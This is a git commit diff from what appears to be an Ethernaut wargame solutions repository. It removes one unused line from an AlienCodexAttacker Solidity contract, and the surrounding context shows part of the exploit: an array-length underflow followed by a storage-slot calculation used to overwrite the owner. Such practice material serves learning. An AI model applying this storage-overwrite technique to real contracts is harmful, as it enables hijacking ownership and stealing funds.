865e63acee26b5dd8de1c4764c18bcf652ced6b3
Sergi Roca Laguna <sergiroca@163.com>
2024-10-04 10:11:23 +0200

    remove unused code

--- ethernaut/src/levels/19-AlienCodex/AlienCodex.sol
+++ ethernaut/src/levels/19-AlienCodex/AlienCodex.sol
@@ -42,7 +42,6 @@ contract AlienCodexAttacker {
         i_target.make_contact();
         //retracting it will change the length to below its limits and cause an overflow
         i_target.retract(); // now codex.length is 2**256, since it undeflowed from 0 to the maximum
-        dynamicArrayPosition = keccak256(1);
         uint256 ownerSlot = TOTAL_CONTRACT_SLOTS -
             uint256(keccak256(abi.encode(1))) +
             1;
